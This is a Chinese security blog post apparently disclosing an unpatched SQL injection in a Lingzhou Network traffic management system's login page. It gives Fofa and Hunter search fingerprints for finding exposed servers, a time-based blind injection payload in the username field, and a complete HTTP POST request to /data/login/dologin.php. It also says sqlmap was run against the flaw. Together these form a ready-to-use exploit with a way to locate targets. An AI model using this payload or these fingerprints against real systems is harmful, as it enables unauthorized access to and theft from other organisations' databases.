#  1Day-某优先锋-流量管理系统存在SQL注入漏洞   
原创 狐狸  狐狸说安全   2024-12-17 01:01  
  
**免责声明**  
  
由于传播、利用本公众号狐狸说安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号  
狐狸说安全及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉，谢谢！  
### 0x01 概述  
  
灵州网络隶属于北京灵州网络技术有限公司，公司是注册成立于北京市中关村高科技园区的专业化的计算机软件公司，是经北京市科委认定的高新技术企业。公司致力于研究发展计算机网络技术，开发销售具有自主知识产权的网络计费、网络安全、网络应用等专业网络软件产品，对客户提供专业化的一站式技术服务。公司以市场需求为导向，以先进的技术为保证，以向用户提供优质的产品和服务为目标，以专业化技术、系统化产品和优质的服务树立公司形象。公司的特点是计算机软件专业背景深厚，管理人员和主要技术人员长期从事系统软件底层的技术研究和项目开发，如UNIX操作系统内核，网络协议等，公司的专有技术是软件工程化管理、具有可操作性的自动集成技术、软件的自动配置和工厂化管理、一致性测试和软件的相关标准和开发规范、指南、工具等。公司所有产品都具有自主知识产权。“学习型团队”是公司始终追求的目标，鼓励员工充分发挥聪明才智与潜能，并尽一切力量为员工搭建施展才能的舞台，使员工与企业共同成长！  
### 0x02 正文  
  
**Fofa：icon_hash="-759778190"**  
  
**鹰图指纹：web.icon="657affa2bb305c999a93ca1a57d8b56f"**  
  
****  
登录的时候进行抓包，漏洞点在username处  
  
Username处存在注入  
  
测试payload：  
```
admin'and sleep(5) and '1
```  
  
数据包：  
```
POST /data/login/dologin.php HTTP/1.1
Host: xxxxx
Content-Length: 60
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Accept: */*
Origin: http://xxxx
Referer: http://xxxx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie:
Connection: close
action=login&username=admin'and sleep(5) and '1&passwd=admin
```  
  
使用sqlmap进行测试  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwZeMsMjjpDxKXRLSYvbzTk1OV0Yyw2Ff9ykwEaJXOFwSuQ94E7Y4iapcqUmEqx35UsbOnqxqiaLEiaGg/640?wx_fmt=png&from=appmsg "")  
  
  
**0x03结尾**  
  
此漏洞前几天已上传圈子  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/pH5fZ5lvwwZeMsMjjpDxKXRLSYvbzTk1mlNUIn13qNticMAguUEvLsGgiaOJ9Y2cYG1DZmCXStTGaVjAmsWRskzw/640?wx_fmt=png&from=appmsg "")  
  
**0x04内部圈子**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/pH5fZ5lvwwZeMsMjjpDxKXRLSYvbzTk1vChyWIMaHZNhCHesKiaUnO06Zt4xywNy2clScCE25ynIWd7dcAPThtg/640?wx_fmt=jpeg&from=appmsg "")  
  
